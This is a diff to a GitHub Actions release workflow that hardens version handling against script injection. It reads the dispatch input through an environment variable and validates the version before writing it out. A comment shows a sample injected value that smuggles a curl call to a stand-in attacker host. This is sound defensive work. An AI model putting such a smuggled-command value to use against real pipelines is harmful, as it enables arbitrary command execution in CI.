@@ -5,8 +5,8 @@ on:
     tags:
       # Semver tags only. The floating major pointer (v1) sits on the same commit
       # as the release tag, and a bare 'v*' would fire this workflow for it too —
-      # where "Validate version format" rejects anything that is not vX.Y.Z, so
-      # every pointer move would leave a failed run behind.
+      # where "Extract and validate version" rejects anything that is not vX.Y.Z,
+      # so every pointer move would leave a failed run behind.
       - 'v[0-9]*.[0-9]*.[0-9]*'
   workflow_dispatch:
     inputs:
@@ -30,24 +30,37 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6
 
-      - name: Extract version
+      # The workflow_dispatch input arrives through `env:` rather than through
+      # `${{ }}`. A `${{ }}` expression is substituted into the script BEFORE
+      # the shell parses it, so the value becomes shell source rather than data
+      # — `v1.0.0"; curl attacker.example; echo "` would execute. Read from the
+      # environment instead and the shell only ever sees it as a string.
+      #
+      # Validation happens here, before the value reaches $GITHUB_OUTPUT, and
+      # not in a later step. `version` is interpolated into `run:` blocks in a
+      # dozen places further down this file, so the output itself has to be
+      # safe by construction: once it must match the pattern below, no
+      # downstream interpolation can carry a metacharacter. Validating after
+      # the write would leave every one of those sites exposed, and would run
+      # only after this step had already emitted the value.
+      - name: Extract and validate version
         id: version
+        env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            VERSION="${{ github.event.inputs.version }}"
+          if [ "${GITHUB_EVENT_NAME}" = "workflow_dispatch" ]; then
+            VERSION="${INPUT_VERSION}"
           else
             VERSION="${GITHUB_REF#refs/tags/}"
           fi
-          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
-          echo "Version: ${VERSION}"
-
-      - name: Validate version format
-        run: |
-          VERSION="${{ steps.version.outputs.version }}"
           if [[ ! $VERSION =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-            echo "Error: Version must be in format v1.2.3"
+            # Echo the rejected value: it is a shell variable here, not source,
+            # and a release that fails on a typo should say which typo.
+            echo "Error: Version must be in format v1.2.3 (got: ${VERSION})"
             exit 1
           fi
+          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
+          echo "Version: ${VERSION}"
 
   build:
     name: Build Release
